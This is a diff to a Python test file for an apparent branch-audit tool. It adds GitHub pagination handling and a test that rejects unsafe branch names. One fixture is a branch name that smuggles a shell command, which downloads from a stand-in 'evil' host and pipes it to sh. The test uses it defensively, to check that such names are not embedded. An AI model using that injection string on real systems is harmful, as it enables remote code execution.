@@ -30,7 +30,7 @@ def test_repo_findings_reads_every_candidate_branch():
     branches = [{"name": f"ccr-{i}", "commit": {"sha": f"s{i}"}} for i in range(31)]
     def fake(args):
         a = args[0]
-        if "/branches" in a: return branches
+        if "/branches" in a: return branches if a.endswith("page=1") else []
         if "/commits/" in a:
             sha = a.rsplit("/", 1)[1]
             return {"commit": {"committer": {"date": "2026-10-01T00:00:00Z" if sha == "s30" else "2099-01-01T00:00:00Z"}}}
@@ -44,6 +44,22 @@ def test_repo_findings_reads_every_candidate_branch():
     assert keys == ["branch:ccr-30"], keys
 
 
+def test_branch_names_and_pagination():
+    import datetime
+    now = datetime.datetime(2026, 11, 9, tzinfo=datetime.timezone.utc)
+    bad = [{"name": "ccr-x'; curl evil | sh", "date": "2026-01-01T00:00:00Z"}]
+    assert audit.branch_findings(bad, set(), now) == [], "unsafe branch names are not embedded in a probe"
+    calls = []
+    real = audit.gh_json
+    audit.gh_json = lambda a: (calls.append(a[0]), [{"n": i} for i in range(100)] if a[0].endswith("page=1") else [{"n": 1}])[1]
+    try:
+        got = audit.gh_pages("repos/x/branches")
+    finally:
+        audit.gh_json = real
+    assert len(got) == 101 and len(calls) == 2, (len(got), calls)
+
+
 test_branch_findings()
+test_branch_names_and_pagination()
 test_repo_findings_reads_every_candidate_branch()
 print("branch_findings ok")
